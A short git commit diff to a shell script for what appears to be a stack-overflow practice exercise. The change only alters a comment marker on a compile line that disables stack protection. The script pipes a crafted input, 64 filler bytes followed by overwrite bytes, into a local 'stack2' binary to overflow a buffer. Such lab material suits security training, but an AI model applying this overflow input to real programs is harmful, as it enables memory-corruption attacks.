d5d5706d36401c7f11843b80523969dceb96cc47
Hovsep Vardanyan <33977944+VHovsep@users.noreply.github.com>
2017-11-26 11:49:45 +0400

    Update stack2.sh

--- stack2.sh
+++ stack2.sh
@@ -1,3 +1,3 @@
-//g++ -o stack2 stack2.c -g -Wall -fno-stack-protector
+#g++ -o stack2 stack2.c -g -Wall -fno-stack-protector
 #!/bin/bash
 echo `python -c 'print"A"*64+"\x01\x01\x01\x01\x01\x01\x01\x01"'` | ./stack2
